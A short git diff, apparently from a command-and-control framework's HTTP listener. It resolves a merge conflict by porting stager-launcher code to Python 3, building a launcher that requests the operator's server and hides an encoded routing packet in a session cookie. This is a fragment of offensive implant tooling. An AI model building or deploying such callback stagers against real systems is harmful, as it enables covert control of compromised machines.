@@ -447,16 +447,13 @@ class Listener(object):
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON',
                                                              meta='STAGE0', additional='None', encData='')
-<<<<<<< HEAD
-                b64RoutingPacket = base64.b64encode(routingPacket)
-                launcherBase += "req=urllib2.Request(server+t);\n"
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
-=======
+
                 b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
                 
                 launcherBase += "req=urllib.Request(server+t);\n"
->>>>>>> python-fixes
+
+                # add the RC4 packet to a cookie
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
